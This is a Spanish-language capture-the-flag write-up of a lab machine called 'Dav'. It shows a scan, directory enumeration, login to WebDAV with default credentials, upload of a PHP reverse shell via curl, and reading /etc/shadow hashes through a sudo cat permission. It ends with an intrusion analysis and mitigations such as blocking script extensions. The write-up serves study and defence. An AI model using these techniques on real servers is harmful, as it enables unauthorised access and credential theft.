# Dav
Máquina sencillita y buena para empezar, el file upload es algo que se pasa por alto muchas veces al comprometer un apache

Interesantes: Curl File Upload
## Initial Scan
```
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```
## Enum
No hay muchos servicios entre los que elegir, vayamos a la web
### HTTP
#### Gobusting
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/webdav (Status: 401)
```
#### Webdav
En el ultimo tenemos un basic authentication, por lo visto hay varios pares de creds por defecto
```
wampp:xampp
jigsaw:jigsaw
```
Probamos estas y con las primeras entramos, dentro del directorio encontramos un archivo llamado passwd.dav
```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```
Podriamos intentrar crackear el hash pero ya que tenemos un user:pass valido podemos intentar subir una reverse shell, en mi caso la de Pentest Monkey
```
 curl http://10.10.62.113/webdav/hell.php -u wampp:xampp --upload-file php-reverse-shell.php
```
Abrimos un listener con netcat en local y accedemos al archivo subido desde el navegador y tenemos shell como www-data, veamos si podemos escalar desde aqui.

## Privesc
```
User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
``` 
Nuestro usuario tiene total acceso a lectura de ficheros, con esto podemos leer las flag sin ningun problema

Estuve tanteando si teniamos alguna manera de conseguir escalar a root pero no encontre ninguna de las tipicas, lo unico que podriamos intentar escalar lateralmente hacia Merlin o Wamp si lograsemos crackear su hash
```
merlin:$1$EWeeql.h$8mH.7rEhPRGsOb5ECtmIe1:18134:0:99999:7:::
wampp:$6$f8LMirW0$43znQ5kMsELDO9BdUmhbGkUEnVH2OKXZjfEtsyUgbvL79KoJtgLkdbJpHw4OuDDIMtaXjGjkjaRKDv1FFxKsr/:18134:0:99999:7:::
```
Escalar lateralmente hacia Merlin seria una gran idea ya que podemos comprobar que pertenece al grupo de sudo
```
groups merlin
merlin : merlin adm cdrom sudo dip www-data plugdev lpadmin sambashare
```
Podría ser otra manera interesante de escalar privilegios en esta máquina si quisieramos conseguir acceso real en lugar de simplemente leer la flag, pero parece que la contraseña utiliza no esta en rockyou.txt
# Analisís de la intrusión
### Creds por defecto
El servidor webdav presenta las credenciales por defecto lo cual nos permitio el acceso incial
### Unrestricted file upload
El servidor webdabv nos permite subir archivos sin comprobar el tipo de archivo subido, esto nos llevo a conseguir un RCE
### Privileged cat execution
Ejecutar cat de manera privilegiada nos permite obtener acceso a archivos sensibles como /etc/shadow

# Solución
### Unrestricted file upload
En el archivo de configuración de webdav se puede establecer que extensiones no esta permitido subir añadir a la lista .php , php2 , .php3 , .php4 , .php5 , .php6 , .php7 , .php8 , .php9 , .phtm , .aspx , .js , .war 
### Privileged cat execution
Permitir a un usuario regular ejecutar cat como root no parece algo con mucho sentido, la principal opción para mitigar esto seria eliminar este permiso si por algún casual se diese un caso en el que esto fuera necesario lo ideal seria introducir el comando entero en /etc/sudoers limitando bastante la explotación y aun asi lo optimo seria establecer una politica de Seccomp al respecto
